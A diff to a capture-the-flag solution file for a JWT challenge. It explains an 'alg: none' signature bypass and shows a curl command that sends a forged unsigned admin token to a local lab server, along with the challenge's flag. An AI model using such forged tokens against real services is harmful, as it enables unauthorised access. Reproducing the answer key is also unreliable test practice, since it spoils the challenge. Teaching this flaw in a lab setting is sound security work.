@@ -1,9 +1,9 @@
-Solution: A12 - JWT
+# Solution: A12 - JWT
 
-Concept  
+## Concept
 JSON Web Token (JWT) signature bypass via `alg: none`.
 
-Walkthrough  
+## Walkthrough
 1. Inspect `challenge/app/app.py`.
 2. Notice the algorithmic bypass:
    ```python
@@ -18,7 +18,7 @@ Walkthrough
    ```bash
    curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ." http://localhost:5006/
    ```
-5. Flag output: `flag{jwt token forged}`.
+5. Flag output: `jwt token forged`.
 
-Flag  
-`flag{jwt token forged}`
+## Flag
+`jwt token forged`
